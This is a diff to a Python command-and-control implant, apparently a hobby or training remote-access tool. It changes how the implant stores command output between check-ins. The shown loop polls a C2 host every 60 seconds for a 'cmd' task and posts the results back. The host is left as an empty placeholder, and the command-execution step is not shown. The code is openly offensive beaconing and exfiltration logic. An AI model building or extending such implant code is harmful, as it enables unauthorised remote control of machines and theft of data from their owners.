@@ -19,8 +19,7 @@ def main():
     new = True
     host = ""
     init_check_in = {} # maybe have a pre-defined set of things to send to the C2 upon execution of implant
-    data = None # could be a dict or byte object according requests.post() docs
-
+    data = dict(ns="") 
 
     while True:
         if new:
@@ -30,11 +29,11 @@ def main():
                 new = False
             time.sleep(60)
         else:
-            if data != None: # if data is not None, then we are returning output from a command
+            if data['ns'] != "": # if data['ns'] is not an empty string, then we are returning output from a command
                 resp = requests.post(host, data)
                 if resp.status_code == 200:
                     print("[+] Successfully sent data. Checking back in 60 seconds for new task")
-                    data = None
+                    data['ns'] = ""
                 else:
                     print("[-] There was an error. Will try again in 60 seconds")
                 time.sleep(60)
@@ -43,7 +42,6 @@ def main():
                 resp = requests.get(host)
                 if resp.status_code == 200:
                     print("[+] Received new task -- working....")
-                    data = dict(ns="")
                     command = resp.json()['cmd'] # cmd will be a key with a list of strings as the value
                                                  # will need to properly parse the command and args server-side
                                                  # before sending to implant 
